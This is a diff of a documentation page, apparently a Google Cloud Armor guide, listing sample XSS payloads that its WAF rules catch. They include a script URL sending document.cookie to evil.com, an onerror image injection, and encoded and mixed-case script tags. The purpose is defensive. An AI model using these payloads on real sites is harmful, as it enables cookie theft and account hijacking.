@@ -178,22 +178,22 @@ gcloud compute security-policies rules create 1400 \
 Here are some XSS payloads that Cloud Armor's rules will catch:
 
 **Basic script injection:**
-```
+```text
 https://example.com/search?q=<script>document.location='https://evil.com/steal?c='+document.cookie</script>
 ```
 
 **Event handler injection:**
-```
+```text
 https://example.com/profile?name="><img src=x onerror=alert(1)>
 ```
 
 **Encoded payloads:**
-```
+```text
 https://example.com/page?input=%3Cscript%3Ealert(1)%3C%2Fscript%3E
 ```
 
 **Obfuscated injection:**
-```
+```text
 https://example.com/data?val=<ScRiPt>alert(String.fromCharCode(88,83,83))</sCrIpT>
 ```
 
